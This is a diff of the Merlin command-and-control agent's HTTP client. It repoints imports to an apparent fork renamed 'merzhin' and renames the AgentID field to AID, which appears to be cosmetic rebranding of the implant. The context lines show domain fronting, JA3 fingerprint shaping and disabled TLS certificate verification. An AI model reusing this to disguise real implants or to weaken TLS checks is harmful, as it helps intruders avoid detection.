@@ -45,13 +45,13 @@ import (
 	"gopkg.in/square/go-jose.v2/jwt"
 
 	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg/core"
-	"github.com/Ne0nd0g/merlin/pkg/messages"
+	"github.com/testtoto1337/merzhin/pkg/core"
+	"github.com/testtoto1337/merzhin/pkg/messages"
 
 	// Internal
-	"github.com/Ne0nd0g/merlin-agent/cli"
-	"github.com/Ne0nd0g/merlin-agent/clients"
-	"github.com/Ne0nd0g/merlin-agent/crypto/opaque"
+	"github.com/testtoto1337/merzhin-agent/cli"
+	"github.com/testtoto1337/merzhin-agent/clients"
+	"github.com/testtoto1337/merzhin-agent/crypto/opaque"
 )
 
 // Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
@@ -69,14 +69,14 @@ type Client struct {
 	PaddingMax int               // PaddingMax is the maximum size allowed for a randomly selected message padding length
 	JA3        string            // JA3 is a string that represent how the TLS client should be configured, if applicable
 	psk        string            // PSK is the Pre-Shared Key secret the agent will use to start authentication
-	AgentID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
+	AID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
 	opaque     *opaque.User      // TODO Turn this into a generic authentication package interface
 	currentURL int               // the current URL the agent is communicating with
 }
 
 // Config is a structure that is used to pass in all necessary information to instantiate a new Client
 type Config struct {
-	AgentID     uuid.UUID // The Agent's UUID
+	AID     uuid.UUID // The Agent's UUID
 	Protocol    string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
 	Host        string    // Host is used with the HTTP Host header for Domain Fronting activities
 	Headers     string    // Headers is a new-line separated string of additional HTTP headers to add to client requests
@@ -95,7 +95,7 @@ func New(config Config) (*Client, error) {
 	cli.Message(cli.DEBUG, "Entering into clients.http.New()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Config: %+v", config))
 	client := Client{
-		AgentID:   config.AgentID,
+		AID:   config.AID,
 		URL:       config.URL,
 		UserAgent: config.UserAgent,
 		Host:      config.Host,
@@ -171,7 +171,7 @@ func getClient(protocol string, proxyURL string, ja3 string) (*http.Client, erro
 	// Setup TLS configuration
 	TLSConfig := &tls.Config{
 		MinVersion:         tls.VersionTLS12,
-		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
+		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/testtoto1337/merzhin/issues/59 TODO fix this
 		CipherSuites: []uint16{
 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
@@ -292,7 +292,7 @@ func (client *Client) getJWT() (string, error) {
 	cl := jwt.Claims{
 		Expiry:   jwt.NewNumericDate(time.Now().UTC().Add(time.Second * 10)),
 		IssuedAt: jwt.NewNumericDate(time.Now().UTC()),
-		ID:       client.AgentID.String(),
+		ID:       client.AID.String(),
 	}
 
 	agentJWT, err := jwt.SignedAndEncrypted(signer, encrypter).Claims(cl).CompactSerialize()
